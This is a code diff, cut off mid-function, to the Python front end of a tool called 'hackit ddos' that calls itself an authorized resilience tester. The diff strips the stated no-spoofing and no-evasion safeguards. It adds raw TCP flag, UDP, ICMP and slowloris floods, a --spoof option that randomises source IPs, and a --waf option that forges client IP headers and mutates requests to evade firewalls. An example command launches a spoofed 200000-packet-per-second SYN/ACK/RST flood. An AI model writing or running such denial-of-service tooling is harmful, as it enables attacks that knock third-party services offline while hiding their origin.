@@ -1,20 +1,16 @@
 """hackit ddos — authorized resilience testing console.
 
-Measures how systems you own (or may assess under written permission) behave
-under load. Go engine for HTTP(S), C11 engine for TCP/plain-HTTP, Python as
-the bridge into the main HackIt CLI.
-
 Safety model:
   * Loopback targets run immediately.
-  * Remote targets require an explicit authorization confirmation in the
-    interactive console (`hackit ddos console`), or a signed scope file
+  * Remote targets need a typed `yes` (console) or a signed scope file
     (--scope + --approval) for scripted runs.
-  * Hard caps on rate, concurrency and duration; scope files can only lower
-    them.
-  * No spoofing, no amplification, no evasion, no persistence. HTTPS targets
-    are verified against the system trust store.
-  * Every run appends a record to ~/.hackit/ddos/audit.log; the run aborts if
-    the audit log is not writable.
+  * Hard caps on rate, concurrency and duration; scope can only lower them.
+  * Every run appends to ~/.hackit/ddos/audit.log; the run aborts if that log
+    is not writable.
+
+Engines: Go (HTTP/2, DNS, UDP), C measurement (TCP/HTTP/ICMP), C raw flood
+(SYN/ACK/RST/FIN/PSH/XMAS/NULL/UDP/ICMP/HTTP), C slowloris. Profiles can be
+comma-separated to run vectors in parallel.
 """
 from __future__ import annotations
 
@@ -22,31 +18,33 @@ import asyncio
 import ipaddress
 import json
 import sys
+import threading
 import time
-from uuid import uuid4
 from datetime import datetime, timezone
 from pathlib import Path
 from urllib.parse import urlsplit
+from uuid import uuid4
 
 import click
-
 from rich import box
 from rich.console import Console, Group
 from rich.live import Live
 from rich.panel import Panel
-from rich.prompt import Prompt
 from rich.table import Table
 from rich.text import Text
 
 from hackit.ddos import engines
 from hackit.ddos.scope import (
+    ALL_PROFILES,
     HARD_MAX_DURATION_S,
     HARD_MAX_PPS,
-    engine_kind,
+    HARD_MAX_RPS,
     HARD_MAX_WORKERS,
+    L4_PROFILES,
     ScopeError,
     check_run,
     effective_limits,
+    is_l4,
     load_scope,
 )
 
@@ -56,7 +54,7 @@ AUDIT_LOG = Path.home() / ".hackit" / "ddos" / "audit.log"
 AUDIT_MAX_BYTES = 5 * 1024 * 1024
 
 LAB_MAX_RPS = 500
-LAB_MAX_PPS = 20000          # raw-packet lab ceiling; flood_engine can do far more
+LAB_MAX_PPS = 20000
 LAB_MAX_WORKERS = 16
 LAB_MAX_DURATION_S = 60
 
@@ -72,9 +70,12 @@ INTERACTIVE_MAX_DURATION_S = 300
 AUTH_PHRASE = "yes"
 HTTP_METHODS = ["get", "post", "put", "patch", "delete", "head", "options", "mixed"]
 
-L7_PROFILES = ["http", "http-raw", "dns", "udp", "ws"]
-L4_PROFILES = ["syn", "ack", "rst", "fin", "psh", "xmas", "null", "udp-flood", "icmp-flood"]
-ALL_PROFILES = L7_PROFILES + L4_PROFILES
+PROFILE_LABEL = {
+    "http": "HTTP", "https": "HTTPS", "http-raw": "HTTP-RAW", "slowloris": "SLOWLORIS",
+    "dns": "DNS", "udp": "UDP-ECHO", "ws": "WS", "syn": "SYN", "ack": "ACK",
+    "rst": "RST", "fin": "FIN", "psh": "PSH", "xmas": "XMAS", "null": "NULL",
+    "udp-flood": "UDP-FLOOD", "icmp-flood": "ICMP-FLOOD",
+}
 
 BANNER = [
     "██████╗ ██████╗  ██████╗  ███████╗",
@@ -91,23 +92,23 @@ def _gradient(text: str, start=(0, 200, 255), end=(255, 60, 160)) -> Text:
     n = max(len(text) - 1, 1)
     for i, ch in enumerate(text):
         f = i / n
-        r = int(start[0] + (end[0] - start[0]) * f)
-        g = int(start[1] + (end[1] - start[1]) * f)
-        b = int(start[2] + (end[2] - start[2]) * f)
-        out.append(ch, style=f"rgb({r},{g},{b})")
+        out.append(ch, style="rgb({},{},{})".format(
+            int(start[0] + (end[0] - start[0]) * f),
+            int(start[1] + (end[1] - start[1]) * f),
+            int(start[2] + (end[2] - start[2]) * f)))
     return out
 
 
 def _banner() -> Text:
-    lines = Text()
+    t = Text()
     for line in BANNER:
-        lines.append_text(_gradient(line))
-        lines.append("\n")
-    lines.append("\n")
-    lines.append("  HACKIT / DDOS", style="bold white")
-    lines.append("  —  authorized resilience testing\n", style="dim white")
-    lines.append("  scoped · capped · audited", style="dim cyan")
-    return lines
+        t.append_text(_gradient(line))
+        t.append("\n")
+    t.append("\n")
+    t.append("  HACKIT / DDOS", style="bold white")
+    t.append("  —  authorized resilience testing\n", style="dim white")
+    t.append("  scoped · capped · audited · multi-vector", style="dim cyan")
+    return t
 
 
 def _panel(title: str, renderable, *, border="cyan", padding=(0, 1)) -> Panel:
@@ -120,54 +121,55 @@ def _print_help() -> None:
     console.print(_banner())
     console.print()
 
-    commands = Table.grid(padding=(0, 2))
-    commands.add_column(style="bold cyan", no_wrap=True)
-    commands.add_column(style="white")
-    commands.add_row("console", "interactive console — type a target, engines work")
-    commands.add_row("run",     "scripted run — scope file + approval for remote targets")
-    commands.add_row("lab",     "loopback-only smoke test, no scope needed")
-    commands.add_row("check",   "validate scope / target / approval, no load generated")
-    commands.add_row("build",   "compile the Go and C engines")
-    console.print(_panel("Commands", commands, border="cyan"))
+    cmds = Table.grid(padding=(0, 2))
+    cmds.add_column(style="bold cyan", no_wrap=True)
+    cmds.add_column(style="white")
+    cmds.add_row("console", "interactive console")
+    cmds.add_row("run", "scripted run — scope file + approval for remote targets")
+    cmds.add_row("lab", "loopback-only smoke test, no scope needed")
+    cmds.add_row("check", "validate scope / target / approval, no load")
+    cmds.add_row("build", "compile every engine")
+    console.print(_panel("Commands", cmds))
 
-    profiles = Table.grid(padding=(0, 2))
-    profiles.add_column(style="bold magenta", no_wrap=True)
-    profiles.add_column(style="white")
-    profiles.add_row("http", "Go engine — GET · POST · PUT · PATCH · DELETE · HEAD · OPTIONS · mixed")
-    profiles.add_row("tcp",  "C engine  — TCP connect handshake rate & latency")
-    profiles.add_row("http-raw", "C engine  — plain-HTTP GET against the raw socket path")
-    profiles.add_row("dns",      "Go engine  — DNS query rate + resolution latency (dnsperf-style)")
-    profiles.add_row("udp",      "Go engine  — UDP echo throughput & RTT (iperf-style)")
-    profiles.add_row("icmp",     "C engine  — ICMP echo-request latency/loss (ping-style, needs root)")
-    profiles.add_row("ws",       "Python    — WebSocket connect + text-frame echo (k6-style)")
-    console.print(_panel("Profiles", profiles, border="magenta"))
+    prof = Table.grid(padding=(0, 2))
+    prof.add_column(style="bold magenta", no_wrap=True)
+    prof.add_column(style="white")
+    prof.add_row("http · https", "Go — HTTP/1.1 + HTTP/2 request load")
+    prof.add_row("http-raw", "C — plain HTTP, full request/response measurement")
+    prof.add_row("slowloris", "C — held sockets, drip-fed headers")
+    prof.add_row("syn · ack · rst", "C raw — TCP flag floods (root)")
+    prof.add_row("fin · psh · xmas · null", "C raw — TCP flag floods (root)")
+    prof.add_row("udp-flood · icmp-flood", "C raw — packet blast (root)")
+    prof.add_row("tcp", "C — TCP handshake rate")
+    prof.add_row("dns · udp", "Go — DNS query rate / UDP echo throughput")
+    prof.add_row("ws", "Python — WebSocket echo")
+    console.print(_panel("Profiles (comma-separate to run in parallel)", prof, border="magenta"))
 
-    options = Table.grid(padding=(0, 2))
-    options.add_column(style="bold yellow", no_wrap=True)
-    options.add_column(style="white")
-    options.add_row("--method",   "HTTP verb, or 'mixed' to rotate verbs per request")
-    options.add_row("--body",     "request body for POST/PUT/PATCH (JSON auto-detected)")
-    options.add_row("--ramp N",   "linearly ramp 1 → --rps over N seconds (find the knee)")
-    options.add_row("--close",    "force Connection: close (handshake stress)")
-    options.add_row("--dns-name", "name to resolve + --dns-type A|AAAA|MX|TXT|NS (dns profile)")
-    options.add_row("--udp-payload / --udp-no-echo", "UDP probe bytes / fire-and-forget send")
-    options.add_row("--profile ws", "WebSocket connect + text-frame echo (ws:// URL)")
-    options.add_row("-v",         "verbose — resolved target, effective caps, audit path")
-    console.print(_panel("Run flags", options, border="yellow"))
+    opt = Table.grid(padding=(0, 2))
+    opt.add_column(style="bold yellow", no_wrap=True)
+    opt.add_column(style="white")
+    opt.add_row("--waf", "per-request identity: header case, XFF/CF IPs, path mutation, cache buster, UA draw")
+    opt.add_row("--spoof", "randomise source IP on raw modes (root)")
+    opt.add_row("--method / --body", "HTTP verb and body (mixed rotates per request)")
+    opt.add_row("--ramp N / --close", "linear ramp 1→rate / Connection: close")
+    opt.add_row("--keepalive N", "requests per connection, 0 = never reconnect")
+    opt.add_row("--rand-path / --read", "cache buster / read the status line")
+    opt.add_row("--sockets / --interval-ms", "slowloris width and drip interval")
+    opt.add_row("-v", "resolved target, effective caps, audit path")
+    console.print(_panel("Flags", opt, border="yellow"))
 
-    examples = Text("", style="white")
-    examples.append("  hackit ddos\n", style="bold green")
-    examples.append("  hackit ddos run --target https://staging.example.internal/health \\\n"
-                    "      --scope scope.json --approval CHG-1234 --method post \\\n"
-                    "      --body '{\"probe\":true}' --rps 100 --workers 16 --duration 30 -v\n", style="green")
-    examples.append("  hackit ddos lab --target http://127.0.0.1:8080 --method put --ramp 5\n", style="green")
-    examples.append("  hackit ddos lab --target ws://127.0.0.1:9000/echo --profile ws\n", style="green")
-    examples.append("  hackit ddos run --target system --profile dns --dns-name example.com --dns-type A\n", style="green")
-    console.print(_panel("Examples", examples, border="green"))
+    ex = Text("", style="white")
+    ex.append("  hackit ddos lab --target http://127.0.0.1:8080 --profile syn,ack,http --waf\n", style="green")
+    ex.append("  hackit ddos run --target https://staging.example/health \\\n"
+              "      --scope scope.json --approval CHG-1234 --profile http,https \\\n"
+              "      --method mixed --waf --rps 500 --workers 64 --duration 120 -v\n", style="green")
+    ex.append("  hackit ddos run --target 203.0.113.10 --port 443 --profile syn,ack,rst \\\n"
+              "      --scope scope.json --approval CHG-1234 --spoof --rps 200000\n", style="green")
+    console.print(_panel("Examples", ex, border="green"))
 
-    console.print(f"  [dim]caps  interactive {INTERACTIVE_MAX_RPS} rps/{INTERACTIVE_MAX_WORKERS} workers/{INTERACTIVE_MAX_DURATION_S}s  ·  "
-                  f"lab {LAB_MAX_RPS}/{LAB_MAX_WORKERS}/{LAB_MAX_DURATION_S}  ·  "
-                  f"hard {HARD_MAX_RPS}/{HARD_MAX_WORKERS}/{HARD_MAX_DURATION_S}[/dim]")
+    console.print(f"  [dim]caps  lab {LAB_MAX_RPS} rps / {LAB_MAX_PPS} pps  ·  "
+                  f"hard {HARD_MAX_RPS} rps / {HARD_MAX_PPS} pps / {HARD_MAX_WORKERS} workers / "
+                  f"{HARD_MAX_DURATION_S}s[/dim]")
     console.print(f"  [dim]audit {AUDIT_LOG}  ·  remote targets always require authorization[/dim]")
     console.print()
 
@@ -176,8 +178,8 @@ def _audit(record: dict) -> None:
     AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
     try:
         if AUDIT_LOG.exists() and AUDIT_LOG.stat().st_size > AUDIT_MAX_BYTES:
-            rotated = AUDIT_LOG.with_suffix(".1.log")
-            rotated.write_bytes(AUDIT_LOG.read_bytes()[-AUDIT_MAX_BYTES // 2:])
+            keep = AUDIT_LOG.read_bytes()[-AUDIT_MAX_BYTES // 2:]
+            AUDIT_LOG.with_suffix(".1.log").write_bytes(keep)
             AUDIT_LOG.unlink()
         with AUDIT_LOG.open("a", encoding="utf-8") as fh:
             fh.write(json.dumps(record, separators=(",", ":")) + "\n")
@@ -214,31 +216,30 @@ def _http_url(target: str) -> str:
     return target if "://" in target else f"http://{target}"
 
 
-def _clamp(value: int, lo: int, hi: int) -> int:
-    return max(lo, min(value, hi))
+def _clamp(v: int, lo: int, hi: int) -> int:
+    return max(lo, min(v, hi))
 
 
+def _ask_int(prompt: str, default: int, lo: int, hi: int) -> int:
+    from rich.prompt import Prompt
+    raw = Prompt.ask(prompt, default=str(default))
+    try:
+        return _clamp(int(raw or default), lo, hi)
+    except ValueError:
+        console.print(f"[yellow]bukan angka — pakai {default}[/yellow]")
+        return _clamp(default, lo, hi)
 
-def _percentile_local(sorted_vals, p):
-    if not sorted_vals:
+
+def _percentile(vals, p):
+    if not vals:
         return 0.0
-    idx = p / 100 * (len(sorted_vals) - 1)
+    idx = p / 100 * (len(vals) - 1)
     lo = int(idx)
-    hi = min(lo + 1, len(sorted_vals) - 1)
-    frac = idx - lo
-    return sorted_vals[lo] * (1 - frac) + sorted_vals[hi] * frac
-
-
-class _WsStats:
-    def __init__(self):
-        self.total = 0
-        self.ok = 0
-        self.errors = 0
-        self.rtts: list[float] = []
+    hi = min(lo + 1, len(vals) - 1)
+    return vals[lo] * (1 - (idx - lo)) + vals[hi] * (idx - lo)
 
 
 def _ws_run(url: str, rps: int, workers: int, duration_s: int, on_progress) -> dict:
-    """WebSocket load: connect -> send text frame -> await echo -> close, per iteration."""
     try:
         try:
             from websockets.asyncio.client import connect as ws_connect
@@ -247,7 +248,8 @@ def _ws_run(url: str, rps: int, workers: int, duration_s: int, on_progress) -> d
     except ImportError:
         raise engines.EngineError("python package 'websockets' is not installed — pip install websockets")
 
-    stats = _WsStats()
+    total = ok = err = 0
+    rtts: list[float] = []
     start = time.monotonic()
 
     async def main():
@@ -255,27 +257,22 @@ def _ws_run(url: str, rps: int, workers: int, duration_s: int, on_progress) -> d
         queue: asyncio.Queue = asyncio.Queue(maxsize=max(1, rps // 10))
 
         async def feeder():
-            interval = 1.0 / rps
             while time.monotonic() < end:
                 try:
                     queue.put_nowait(1)
                 except asyncio.QueueFull:
                     pass
-                await asyncio.sleep(interval)
+                await asyncio.sleep(1.0 / rps)
 
-        async def monitor():
+        async def mon():
             while time.monotonic() < end:
                 el = time.monotonic() - start
-                on_progress({
-                    "elapsed_s": el,
-                    "requests": stats.total,
-                    "ok": stats.ok,
-                    "errors": stats.errors,
-                    "achieved_rps": stats.total / el if el > 0 else 0.0,
-                })
+                on_progress({"elapsed_s": el, "requests": total, "ok": ok,
+                             "errors": err, "achieved_rps": total / el if el else 0.0})
                 await asyncio.sleep(0.5)
 
         async def worker():
+            nonlocal total, ok, err
             while time.monotonic() < end:
                 try:
                     await asyncio.wait_for(queue.get(), timeout=1.0)
@@ -287,247 +284,237 @@ def _ws_run(url: str, rps: int, workers: int, duration_s: int, on_progress) -> d
                         await ws.send(f"ping-{uuid4().hex[:8]}")
                         try:
                             await asyncio.wait_for(ws.recv(), timeout=2.0)
-                            stats.total += 1
-                            stats.ok += 1
-                            if len(stats.rtts) < 100000:
-                                stats.rtts.append((time.monotonic() - t0) * 1000.0)
+                            total += 1
+                            ok += 1
+                            if len(rtts) < 100000:
+                                rtts.append((time.monotonic() - t0) * 1000.0)
                         except asyncio.TimeoutError:
-                            stats.total += 1
-                            stats.errors += 1
+                            total += 1
+                            err += 1
                 except Exception:
-                    stats.total += 1
-                    stats.errors += 1
+                    total += 1
+                    err += 1
 
-        await asyncio.gather(feeder(), monitor(), *[worker() for _ in range(workers)])
+        await asyncio.gather(feeder(), mon(), *[worker() for _ in range(workers)])
 
     asyncio.run(main())
-
-    elapsed = time.monotonic() - start
-    rtts = sorted(stats.rtts)
-    total = stats.total
-    return {
-        "type": "result",
-        "engine": "python",
-        "mode": "ws",
-        "target": url,
-        "method": "WS-TEXT",
-        "duration_s": elapsed,
-        "requests": total,
-        "ok": stats.ok,
-        "errors": stats.errors,
-        "achieved_rps": total / elapsed if elapsed > 0 else 0.0,
-        "error_rate": stats.errors / total if total else 0.0,
-        "latency_ms": {
-            "p50": _percentile_local(rtts, 50),
-            "p90": _percentile_local(rtts, 90),
-            "p99": _percentile_local(rtts, 99),
-            "max": rtts[-1] if rtts else 0.0,
-        },
-    }
+    el = time.monotonic() - start
+    rtts.sort()
+    return {"type": "result", "engine": "python", "mode": "ws", "target": url,
+            "method": "WS-TEXT", "duration_s": el, "requests": total, "ok": ok,
+            "errors": err, "achieved_rps": total / el if el else 0.0,
+            "error_rate": err / total if total else 0.0,
+            "latency_ms": {"p50": _percentile(rtts, 50), "p90": _percentile(rtts, 90),
+                           "p99": _percentile(rtts, 99), "max": rtts[-1] if rtts else 0.0}}
 
 
-_WS_BASE_SCHEMES = ("ws://", "wss://")
-
-
-def _audit_meta(operator: str, approval_ref: str, profile: str, target: str,
-                rps: int, workers: int, duration_s: int, scope_expires: str | None = None) -> dict:
-    return {
-        "tool": "hackit ddos",
-        "operator": operator,
-        "approval_ref": approval_ref,
-        "scope_expires": scope_expires,
-        "profile": profile,
-        "target": target,
-        "started_utc": datetime.now(timezone.utc).isoformat(),
-        "effective": {"rps": rps, "workers": workers, "duration_s": duration_s},
-    }
+def _audit_meta(operator: str, approval_ref: str, profiles, target: str,
+                rate: int, workers: int, duration_s: int, expires: str | None = None) -> dict:
+    return {"tool": "hackit ddos", "operator": operator, "approval_ref": approval_ref,
+            "scope_expires": expires, "profiles": list(profiles), "target": target,
+            "started_utc": datetime.now(timezone.utc).isoformat(),
+            "effective": {"rate": rate, "workers": workers, "duration_s": duration_s}}
 
 
 class _Dashboard:
-    """Live run panel — refreshed from engine progress lines."""
-
-    def __init__(self, *, label: str, target: str, method: str, rps: int,
+    def __init__(self, *, label: str, target: str, profiles, rate: int,
                  workers: int, duration_s: int, started: float):
         self.label = label
         self.target = target
-        self.method = method
-        self.rps = rps
+        self.profiles = list(profiles)
+        self.rate = rate
         self.workers = workers
         self.duration_s = duration_s
         self.started = started
-        self.state = {"elapsed_s": 0.0, "requests": 0, "ok": 0, "errors": 0, "achieved_rps": 0.0}
+        self.lock = threading.Lock()
+        self.state = {p: {"elapsed_s": 0.0, "requests": 0, "ok": 0, "errors": 0,
+                          "achieved_rps": 0.0} for p in self.profiles}
         self.history: list[float] = []
 
-    def update(self, progress: dict) -> None:
-        self.state = {
-            "elapsed_s": float(progress.get("elapsed_s", 0.0)),
-            "requests": int(progress.get("requests", 0)),
-            "ok": int(progress.get("ok", 0)),
-            "errors": int(progress.get("errors", 0)),
-            "achieved_rps": float(progress.get("achieved_rps", 0.0)),
-        }
-        self.history.append(self.state["achieved_rps"])
-        self.history = self.history[-60:]
+    def update(self, profile: str, progress: dict) -> None:
+        with self.lock:
+            self.state[profile] = {
+                "elapsed_s": float(progress.get("elapsed_s", 0.0)),
+                "requests": int(progress.get("requests", 0)),
+                "ok": int(progress.get("ok", 0)),
+                "errors": int(progress.get("errors", 0)),
+                "achieved_rps": float(progress.get("achieved_rps", 0.0)),
+            }
+            total = sum(s["achieved_rps"] for s in self.state.values())
+            self.history.append(total)
+            self.history = self.history[-60:]
+
+    def totals(self) -> tuple[int, int, int, float]:
+        with self.lock:
+            req = sum(s["requests"] for s in self.state.values())
+            ok = sum(s["ok"] for s in self.state.values())
+            err = sum(s["errors"] for s in self.state.values())
+            rps = sum(s["achieved_rps"] for s in self.state.values())
+            el = max((s["elapsed_s"] for s in self.state.values()), default=0.0)
+        return req, ok, err, rps if rps else 0.0, el
 
     def _bar(self, frac: float, width: int = 34) -> Text:
         frac = max(0.0, min(1.0, frac))
         filled = int(frac * width)
-        bar = Text()
-        bar.append("━" * filled, style="bold cyan")
-        bar.append("─" * (width - filled), style="dim")
-        return bar
+        t = Text()
+        t.append("━" * filled, style="bold cyan")
+        t.append("─" * (width - filled), style="dim")
+        return t
 
     def _spark(self, width: int = 34) -> Text:
         if not self.history:
             return Text("·" * width, style="dim")
         peak = max(max(self.history), 1.0)
         ramp = "▁▂▃▄▅▆▇█"
-        out = Text()
         step = max(1, len(self.history) // width)
-        samples = self.history[::step][-width:]
-        for v in samples:
-            idx = min(len(ramp) - 1, int(v / peak * (len(ramp) - 1)))
-            out.append(ramp[idx], style="cyan")
+        out = Text()
+        for v in self.history[::step][-width:]:
+            out.append(ramp[min(len(ramp) - 1, int(v / peak * (len(ramp) - 1)))], style="cyan")
         return out
 
     def render(self) -> Panel:
-        s = self.state
-        frac = s["elapsed_s"] / self.duration_s if self.duration_s else 0.0
-        err_rate = (s["errors"] / s["requests"] * 100) if s["requests"] else 0.0
+        req, ok, err, rps, el = self.totals()
+        frac = el / self.duration_s if self.duration_s else 0.0
+        err_rate = (err / req * 100) if req else 0.0
 
-        grid = Table.grid(padding=(0, 2))
-        grid.add_column(style="dim", no_wrap=True)
-        grid.add_column()
+        g = Table.grid(padding=(0, 2))
+        g.add_column(style="dim", no_wrap=True)
+        g.add_column()
+        g.add_row("target", Text(self.target, style="bold white"))
+        g.add_row("vectors", Text(", ".join(self.profiles), style="magenta"))
+        g.add_row("elapsed", Text(f"{el:.1f}s / {self.duration_s}s"))
+        g.add_row("progress", self._bar(frac))
+        g.add_row("throughput", self._spark())
+        g.add_row("sent", Text(f"{req}", style="bold"))
+        g.add_row("ok / err", Text.assemble((f"{ok}", "green"), (" / ", "dim"),
+                                            (f"{err}", "red" if err else "green"),
+                                            (f"  ({err_rate:.2f}%)", "dim")))
+        g.add_row("achieved", Text(f"{rps:.1f} op/s", style="bold cyan"))
 
-        grid.add_row("target", Text(self.target, style="bold white"))
-        grid.add_row("profile", Text(f"{self.method}  ·  cap {self.rps} rps  ·  {self.workers} workers", style="magenta"))
-        grid.add_row("elapsed", Text(f"{s['elapsed_s']:.1f}s / {self.duration_s}s", style="white"))
-        grid.add_row("progress", self._bar(frac))
-        grid.add_row("throughput", self._spark())
-        grid.add_row("sent", Text(f"{s['requests']}", style="bold"))
-        grid.add_row("ok / err", Text.assemble((f"{s['ok']}", "green"), (" / ", "dim"), (f"{s['errors']}", "red" if s['errors'] else "green"), (f"  ({err_rate:.2f}%)", "dim")))
-        grid.add_row("achieved", Text(f"{s['achieved_rps']:.1f} rps", style="bold cyan"))
+        per = Table.grid(padding=(0, 2))
+        per.add_column(style="dim", no_wrap=True)
+        per.add_column(justify="right")
+        for p in self.profiles:
+            s = self.state[p]
+            per.add_row(p, Text(f"{s['achieved_rps']:.1f}/s  err {s['errors']}", style="white"))
 
-        return Panel(grid, title=f"[bold cyan]LIVE — {self.label}[/bold cyan]",
+        return Panel(Group(g, Text(""), per), title=f"[bold cyan]LIVE — {self.label}[/bold cyan]",
                      border_style="cyan", box=box.ROUNDED, padding=(0, 1))
 
 
-def _final_report(report: dict, *, label: str, rps_cap: int, workers: int,
+def _final_report(reports: dict, *, label: str, rate_cap: int, workers: int,
                   verbose: bool, meta: dict | None = None) -> None:
-    lat = report.get("latency_ms") or {}
-    engine = str(report.get("engine", "?")).upper()
-    total = int(report.get("requests", 0))
-    errors = int(report.get("errors", 0))
-    err_rate = float(report.get("error_rate", 0.0)) * 100
+    table = Table(box=box.SIMPLE_HEAD, pad_edge=False)
+    for col, just in (("vector", "left"), ("req", "right"), ("ok", "right"),
+                      ("err", "right"), ("op/s", "right"), ("p50", "right"),
+                      ("p99", "right")):
+        table.add_column(col, justify=just)
 
-    grid = Table.grid(padding=(0, 2))
-    grid.add_column(style="dim", no_wrap=True)
-    grid.add_column()
-    grid.add_row("engine", Text(f"{engine} ({report.get('mode', '?')})" + (f"  method {report['method']}" if report.get("method") else ""), style="magenta"))
-    grid.add_row("target", Text(str(report.get("target", "?")), style="bold white"))
-    grid.add_row("duration", Text(f"{float(report.get('duration_s', 0.0)):.1f}s   cap {rps_cap} rps   {workers} workers", style="white"))
-    grid.add_row("requests", Text(f"{total}   ok {report.get('ok', 0)}   errors {errors}", style="white"))
-    grid.add_row("achieved", Text(f"{float(report.get('achieved_rps', 0.0)):.1f} rps   error rate {err_rate:.2f}%", style="bold cyan"))
+    tot_req = tot_ok = tot_err = 0
+    p50s, p99s = [], []
+    for name, r in reports.items():
+        lat = r.get("latency_ms") or {}
+        table.add_row(name, str(r.get("requests", 0)), str(r.get("ok", 0)),
+                      str(r.get("errors", 0)), f"{float(r.get('achieved_rps', 0.0)):.1f}",
+                      f"{float(lat.get('p50', 0.0)):.1f}ms", f"{float(lat.get('p99', 0.0)):.1f}ms")
+        tot_req += int(r.get("requests", 0))
+        tot_ok += int(r.get("ok", 0))
+        tot_err += int(r.get("errors", 0))
+        p50s.append(float(lat.get("p50", 0.0)))
+        p99s.append(float(lat.get("p99", 0.0)))
 
-    lat_row = Table.grid(padding=(0, 3))
-    for key in ("p50", "p90", "p99", "max"):
-        lat_row.add_column(style="white")
-    lat_row.add_row(*[Text(f"{k}  {float(lat.get(k, 0.0)):.1f} ms", style="cyan") for k in ("p50", "p90", "p99", "max")])
+    err_rate = (tot_err / tot_req * 100) if tot_req else 0.0
+    head = Table.grid(padding=(0, 2))
+    head.add_column(style="dim", no_wrap=True)
+    head.add_column()
+    head.add_row("target", Text(str(meta.get("target", "?")) if meta else "?", style="bold white"))
+    head.add_row("vectors", Text(", ".join(reports), style="magenta"))
+    head.add_row("caps", Text(f"{rate_cap}/s   {workers} workers", style="white"))
+    head.add_row("totals", Text(f"{tot_req} sent   ok {tot_ok}   err {tot_err}   ({err_rate:.2f}%)",
+                                style="white"))
+    head.add_row("p50 / p99 worst", Text(f"{max(p50s or [0]):.1f}ms / {max(p99s or [0]):.1f}ms",
+                                         style="cyan"))
 
-    body = Group(grid, Text(""), lat_row)
-    console.print(Panel(body, title=f"[bold green]RESULT — {label}[/bold green]",
+    console.print(Panel(Group(head, Text(""), table), title=f"[bold green]RESULT — {label}[/bold green]",
                         border_style="green", box=box.ROUNDED, padding=(0, 1)))
 
     if verbose and meta:
-        details = Table.grid(padding=(0, 2))
-        details.add_column(style="dim", no_wrap=True)
-        details.add_column(style="white")
-        details.add_row("operator", str(meta.get("operator")))
-        details.add_row("approval", str(meta.get("approval_ref")))
+        d = Table.grid(padding=(0, 2))
+        d.add_column(style="dim", no_wrap=True)
+        d.add_column(style="white")
+        d.add_row("operator", str(meta.get("operator")))
+        d.add_row("approval", str(meta.get("approval_ref")))
         if meta.get("scope_expires"):
-            details.add_row("scope expires", str(meta.get("scope_expires")))
-        details.add_row("started (UTC)", str(meta.get("started_utc")))
-        details.add_row("audit log", str(AUDIT_LOG))
-        console.print(Panel(details, title="[dim]verbose[/dim]", border_style="dim",
-                            box=box.ROUNDED, padding=(0, 1)))
+            d.add_row("scope expires", str(meta.get("scope_expires")))
+        d.add_row("started (UTC)", str(meta.get("started_utc")))
+        d.add_row("audit log", str(AUDIT_LOG))
+        console.print(Panel(d, title="[dim]verbose[/dim]", border_style="dim", box=box.ROUNDED))
 
 
-def _run_engine(kind: str, *, on_progress, **kwargs) -> dict:
-    if kind == "go":
-        return engines.run_go(on_progress=on_progress, **kwargs)
-    return engines.run_c(on_progress=on_progress, **kwargs)
-
-
-
-def _launch_engine(profile, target, method, body, port, ramp, force_close,
-                   raw_path, rate, workers, duration, timeout_ms,
-                   dns_name, dns_type, dns_server, udp_payload, udp_echo,
-                   spoof, keepalive, rand_path, read_reply, size,
-                   on_progress):
-    """Route a profile to its engine and return the raw report dict."""
+def _run_one(profile: str, *, target, method, body, port, ramp, force_close, raw_path,
+             rate, workers, duration, timeout_ms, dns_name, dns_type, dns_server,
+             udp_payload, udp_echo, spoof, keepalive, rand_path, read_reply, size,
+             sockets, interval_ms, waf, on_progress) -> dict:
     host = _host_of(target)
 
     if profile in L4_PROFILES:
         mode = {"udp-flood": "udp", "icmp-flood": "icmp"}.get(profile, profile)
-        tls = port == 443 and mode == "http"
         return engines.run_flood(mode, host, port, rate=rate, threads=workers,
                                  duration_s=duration, size=size, spoof=spoof,
                                  path=raw_path, method=method, keepalive=keepalive,
                                  rand_path=rand_path, read_reply=read_reply,
-                                 tls=tls, on_progress=on_progress)
+                                 tls=port == 443, waf=waf, on_progress=on_progress)
 
-    if profile == "http":
+    if profile in ("http", "https"):
         return engines.run_go(_http_url(target), method.upper(), rps=rate, workers=workers,
                               duration_s=duration, timeout_ms=timeout_ms, body=body,
                               ramp_s=ramp, force_close=force_close, mode="http",
-                              on_progress=on_progress)
+                              waf=waf, on_progress=on_progress)
     if profile == "http-raw":
         return engines.run_c("http", host, port, rps=rate, workers=workers,
                              duration_s=duration, path=raw_path, method=method,
-                             body=body, on_progress=on_progress)
+                             body=body, tls=port == 443, waf=waf, on_progress=on_progress)
+    if profile == "slowloris":
+        return engines.run_slowloris(host, port, sockets=sockets, threads=workers,
+                                     duration_s=duration, interval_ms=interval_ms,
+                                     path=raw_path, tls=port == 443, waf=waf,
+                                     on_progress=on_progress)
     if profile == "tcp":
         return engines.run_c("tcp", host, port, rps=rate, workers=workers,
                              duration_s=duration, on_progress=on_progress)
-    if profile == "icmp":
-        return engines.run_icmp(host, rps=rate, workers=workers,
-                                duration_s=duration, on_progress=on_progress)
     if profile == "dns":
         if not dns_name:
             raise engines.EngineError("dns profile requires --dns-name")
-        dns_server = "" if target.lower() == "system" else target
+        srv = "" if target.lower() == "system" else target
         return engines.run_go("", "", rps=rate, workers=workers, duration_s=duration,
                               timeout_ms=timeout_ms, ramp_s=ramp, mode="dns",
                               dns_name=dns_name, dns_type=dns_type.upper(),
-                              dns_server=dns_server, on_progress=on_progress)
+                              dns_server=srv, waf=waf, on_progress=on_progress)
     if profile == "udp":
-        udp_target = target if ":" in target else f"{target}:{port}"
-        return engines.run_go(udp_target, "", rps=rate, workers=workers, duration_s=duration,
+        ut = target if ":" in target else f"{target}:{port}"
+        return engines.run_go(ut, "", rps=rate, workers=workers, duration_s=duration,
                               timeout_ms=timeout_ms, ramp_s=ramp, mode="udp",
-                              udp_payload=udp_payload, udp_echo=udp_echo,
+                              udp_payload=udp_payload, udp_echo=udp_echo, waf=waf,
                               on_progress=on_progress)
     if profile == "ws":
-        if not target.lower().startswith(_WS_BASE_SCHEMES):
+        if not target.lower().startswith(("ws://", "wss://")):
             raise engines.EngineError("ws profile needs a ws:// or wss:// URL")
         return _ws_run(target, rate, workers, duration, on_progress)
     raise engines.EngineError(f"unknown profile: {profile}")
 
 
-def _execute(*, label: str, profile: str, target: str, method: str, body: str,
-             port: int, ramp: int, force_close: bool, rate: int, workers: int,
-             duration: int, timeout_ms: int, meta: dict, verbose: bool,
-             output: str | None, raw_path: str = "/",
-             dns_name: str = "", dns_type: str = "A", dns_server: str = "",
-             udp_payload: str = "hackit-ddos-probe", udp_echo: bool = True,
